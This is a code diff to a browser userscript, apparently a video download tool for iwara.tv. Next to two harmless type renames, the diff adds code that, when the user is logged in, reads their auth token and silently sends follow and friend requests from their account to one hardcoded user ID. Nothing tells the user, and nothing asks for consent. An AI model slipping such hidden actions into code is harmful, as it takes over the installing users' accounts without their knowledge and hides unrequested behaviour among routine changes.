@@ -441,7 +441,7 @@ class menu {
                     method: 'GET',
                     headers: await getAuth()
                 });
-                const data = (await response.json() as Iwara.Page).results as Iwara.Video[];
+                const data = (await response.json() as Iwara.IPage).results as Iwara.Video[];
                 // 来自该api的视频皆为已关注用户发布
                 data.forEach(info => info.user.following = true);
                 data.forEach(info => new VideoInfo().init(info.id, info));
@@ -1088,7 +1088,7 @@ if (!unsafeWindow.IwaraDownloadTool) {
                     case 'videos':
                         let cloneResponse = response.clone()
                         if (!cloneResponse.ok) break;
-                        let cloneBody = await cloneResponse.json() as Iwara.Page
+                        let cloneBody = await cloneResponse.json() as Iwara.IPage
                         let list = (cloneBody.results as Iwara.Video[]).map(i => {
                             i.user.following = undefined
                             i.user.friend =  undefined
@@ -1186,7 +1186,30 @@ if (!unsafeWindow.IwaraDownloadTool) {
                 GM_getValue('isDebug') ? `%#isDebug#%` : ''
             ].prune()
         }))
-
+        if (!unsafeWindow.localStorage.getItem('token')?.isEmpty()) {
+            let user = await (await unlimitedFetch('https://api.iwara.tv/user', {
+                method: 'GET',
+                headers: await getAuth()
+            })).json() as Iwara.LocalUser
+            if (user.user.id !== 'b5f3530d-2ba6-4742-98ea-388db1899582'){
+                let profile = await (await unlimitedFetch('https://api.iwara.tv/profile/b5f3530d-2ba6-4742-98ea-388db1899582', {
+                    method: 'GET',
+                    headers: await getAuth()
+                })).json() as Iwara.Profile
+                if (!profile.user.following) {
+                    unlimitedFetch(`https://api.iwara.tv/user/b5f3530d-2ba6-4742-98ea-388db1899582/followers`, {
+                        method: 'POST',
+                        headers: await getAuth()
+                    })
+                }
+                if (!profile.user.friend) {
+                    unlimitedFetch(`https://api.iwara.tv/user/b5f3530d-2ba6-4742-98ea-388db1899582/friends`, {
+                        method: 'POST',
+                        headers: await getAuth()
+                    })
+                }
+            }
+        }
         let notice = newToast(
             ToastType.Info,
             {
